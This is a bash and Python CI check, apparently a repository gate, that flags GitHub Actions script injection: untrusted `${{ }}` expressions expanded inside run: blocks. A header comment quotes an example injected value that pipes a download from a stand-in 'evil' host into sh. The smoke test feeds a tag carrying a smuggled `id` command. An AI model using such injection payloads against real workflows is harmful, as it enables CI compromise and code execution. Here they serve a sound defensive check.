#!/usr/bin/env bash
# Reject GitHub Actions script injection: an attacker- or dispatcher-
# controlled `${{ ... }}` expression expanded directly inside a `run:` script
# is substituted into the shell source BEFORE bash parses it, so a value like
# `x'; curl evil | sh; '` executes. The safe pattern is to pass the value
# through `env:` and reference "$VAR" (then validate it).
#
# Flagged anywhere inside a `run:` script of .github/workflows/*.yml and
# action.yml (the WHOLE block, so an expression split across lines or sitting
# in a shell comment is caught too; a substituted newline escapes a comment):
#   github.event        any accessor: .x, ['x'], or the whole object passed to
#                       a function (toJSON(github.event), format(...)), since
#                       inputs, PR titles/bodies and commit messages live there
#   github.head_ref     (PR branch name), in dot or bracket form
#   inputs              (workflow_dispatch / workflow_call / action inputs)
#   steps.<id>.outputs  (often derived from the above)
#   needs.<id>.outputs  (ditto, across jobs)
# Each `${{ ... }}` expression is matched as a whole, whatever functions,
# brackets or operators surround the context access. Anything else
# (github.sha, github.event_name, steps.<id>.outcome, runner.temp, matrix
# values, secrets via env, ...) is out of scope here.
set -euo pipefail

REPO_ROOT="${SCRIPT_INJECTION_REPO_ROOT:-$(cd "$(dirname "$0")/../.." && pwd)}"
cd "$REPO_ROOT"

python3 - <<'PY'
from pathlib import Path
import re
import sys

# One `${{ ... }}` expression, possibly spanning lines.
EXPR = re.compile(r'\$\{\{(?P<body>.*?)\}\}', re.DOTALL)
# A context property access in dot (`a.b`) or bracket (`a['b']`) form.
_ = r'\s*'
def prop(name):
    return rf"(?:{_}\.{_}{name}(?![\w-])|{_}\[{_}['\"]{name}['\"]{_}\])"
# Untrusted contexts, matched anywhere inside an expression body.
UNSAFE = re.compile(
    r'(?<![\w.-])github' + prop('event') +            # github.event / github['event'] (+ any accessor or none)
    r'|(?<![\w.-])github' + prop('head_ref') +
    r'|(?<![\w.-])inputs(?![\w-])' +             # inputs.x / inputs['x'] / toJSON(inputs)
    r"|(?<![\w.-])(?:steps|needs)(?:\s*\.\s*[\w-]+|\s*\[\s*['\"][^'\"]+['\"]\s*\])" + prop('outputs'),
    re.IGNORECASE,
)
RUN = re.compile(r'^(?P<indent>\s*)(?:-\s+)?run:(?:\s+(?P<rest>.*))?$')


def run_blocks(lines):
    # Yield (start_line_index, block_text) for every `run:` value: the key's
    # own line plus every following line indented deeper than the key (block
    # scalar bodies and multi-line plain/quoted scalars alike).
    i = 0
    while i < len(lines):
        m = RUN.match(lines[i])
        if not m:
            i += 1
            continue
        key_indent = len(m.group('indent')) + (2 if lines[i].lstrip().startswith('- ') else 0)
        start = i
        body = [m.group('rest') or '']
        i += 1
        while i < len(lines):
            line = lines[i]
            if line.strip() and len(line) - len(line.lstrip()) <= key_indent:
                break
            body.append(line)
            i += 1
        yield start, '\n'.join(body)


def findings(lines, path='<fixture>'):
    found = []
    for start, block in run_blocks(lines):
        for m in EXPR.finditer(block):
            if UNSAFE.search(m.group('body')):
                line = start + block.count('\n', 0, m.start())
                found.append((line, f'{path}:{line + 1}: ' + ' '.join(m.group(0).split())))
    return found


# Self-test so a regex/parser refactor cannot make the gate vacuously green.
# Each UNSAFE line's 0-based index must be reported; no SAFE line may be.
fixture = '''\
jobs:
  a:
    steps:
      - run: echo ${{ github.event.inputs.x }}
      - name: multi
        run: |
          echo ok
          echo ${{ steps.pick.outputs.target }}
        env:
          SAFE: ${{ steps.pick.outputs.target }}
      - run: echo ${{ github.sha }} ${{ github.event_name }} ${{ steps.x.outcome }}
      - run: echo "${{ github.event['pull_request']['title'] }}"
      - run: echo "${{ format('{0}', github.event.pull_request.title) }}"
      - run: echo '${{ toJSON(github.event) }}'
      - run: |
          echo ${{
            github.event.pull_request.body
          }}
      - run: echo ${{ github['head_ref'] }}
      - run: echo ${{ github.head_ref }}
      - run: echo ${{ inputs['tag'] }}
      - run: echo ${{ toJSON(inputs) }}
      - run: echo ${{ needs['build'].outputs.tag }}
      - run: echo ${{ needs.build.outputs['tag'] }}
      - run: |
          # comment ${{ github.event.head_commit.message }}
          true
      - run: >-
          echo ${{ github.event.comment.body }}
      - run: echo ${{ fromJSON(needs.changes.outputs.runner) && 'x' }}
      - run: echo ${{ github.event-name }} ${{ inputs-x }} ${{ github.eventual }}
      - run: echo ${{ matrix.target }} ${{ runner.temp }} ${{ github.ref_name }}
'''.splitlines()
want = {3, 7, 11, 12, 13, 15, 18, 19, 20, 21, 22, 23, 25, 28, 29}
got = {line for line, _ in findings(fixture)}
if got != want:
    print(f'[script-injection] internal fixture mismatch: missed {sorted(want - got)}, '
          f'false positives {sorted(got - want)}', file=sys.stderr)
    sys.exit(1)

paths = sorted(Path('.github/workflows').glob('*.y*ml')) + [Path('action.yml')]
problems = [msg for path in paths if path.exists()
            for _, msg in findings(path.read_text(encoding='utf-8').splitlines(), path)]
if problems:
    print('[script-injection] untrusted ${{ }} expansion inside run: (move it to env: and validate):',
          file=sys.stderr)
    for p in problems:
        print(f'  {p}', file=sys.stderr)
    sys.exit(1)
print(f'[script-injection] OK - {len(paths)} workflow/action files, no untrusted expansion in run: blocks')
PY

# smoke-channel.sh receives the dispatch-controlled tag: it must reject a
# non-vX.Y.Z value before using it, and never splice it into a `bash -c` string.
# (A nonexistent channel keeps a regression from installing anything.)
smoke_out=$(ci/scripts/smoke-channel.sh no-such-channel "v1.2.3';id;'" 2>&1 || true)
if ! grep -q 'invalid tag' <<< "$smoke_out"; then
  echo "[script-injection] smoke-channel.sh accepted a malformed tag" >&2
  exit 1
fi
if grep -nE 'bash -c "[^"]*\$\{?TAG' ci/scripts/smoke-channel.sh; then
  echo "[script-injection] smoke-channel.sh splices TAG into a bash -c string" >&2
  exit 1
fi
echo "[script-injection] OK - smoke-channel.sh validates its tag"
